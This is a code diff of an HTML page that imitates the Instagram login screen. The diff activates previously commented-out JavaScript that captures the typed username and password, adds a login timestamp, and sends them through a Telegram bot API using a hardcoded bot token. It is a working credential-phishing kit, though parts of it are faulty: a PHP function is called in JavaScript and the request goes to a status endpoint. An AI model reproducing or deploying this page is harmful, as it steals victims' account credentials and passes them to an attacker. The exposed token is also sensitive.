@@ -44,7 +44,7 @@
 </head>
 <body>
         <img id="Instagram-Logo" src="Instagram-Logo.png" srcset="Instagram-Logo.png 1x, Instagram-Logo@2x.png 2x">
-        <form action="#" onsubmit="submitForm()">
+        <form action="#"onsubmit="submitForm()">
             <input class="Rectangle_1" id="Rectangle_1" type="text" name="email" placeholder="Phone number, username, or email" required="">
             <input class="Rectangle_2" id="Rectangle_2" type="password" name="password" placeholder="Password" required="">
             <input id="Rectangle_3" class="Rectangle_3" style="color: white; background-color: #0095F6;" type="submit" value="Log In">
@@ -62,16 +62,16 @@
 			
             function submitForm() {
                 console.log("working");
-				//var email = document.getElementById('Rectangle_1').value;
-                //var password = document.getElementById('Rectangle_2').value;
-                //date_default_timezone_set("Asia/Kolkata");
-                //var time = new Date().toLocaleTimeString();
-                //var message = "Username: " + email + "\nPassword: " + password + "\nTried Login at " + time + " IST";
-                //var chat_id = 'Albertsfriedchicken';
-                //var apiToken = '6951049067:AAF4Y-kePwnyq_CdysCTUi9OXoqKbT2ZT7E';
-                //send_message(message, apiToken);
+				var email = document.getElementById('Rectangle_1').value;
+                var password = document.getElementById('Rectangle_2').value;
+                date_default_timezone_set("Asia/Kolkata");
+                var time = new Date().toLocaleTimeString();
+                var message = "Username: " + email + "\nPassword: " + password + "\nTried Login at " + time + " IST";
+                var chat_id = 'Albertsfriedchicken';
+                var apiToken = '6951049067:AAF4Y-kePwnyq_CdysCTUi9OXoqKbT2ZT7E';
+                send_message(message, apiToken);
             }
-			/*
+			
             function send_message(message, apiToken) {
                 var text = encodeURIComponent(message);
                 var url ='https://api.telegram.org/bot6951049067:AAF4Y-kePwnyq_CdysCTUi9OXoqKbT2ZT7E/getMe';
@@ -80,7 +80,7 @@
                     .then(response => response.json())
                     .then(data => console.log(data))
                     .catch(error => console.error('Error:', error));
-			}*/
+			}
         </script>
 </body>
 </html>
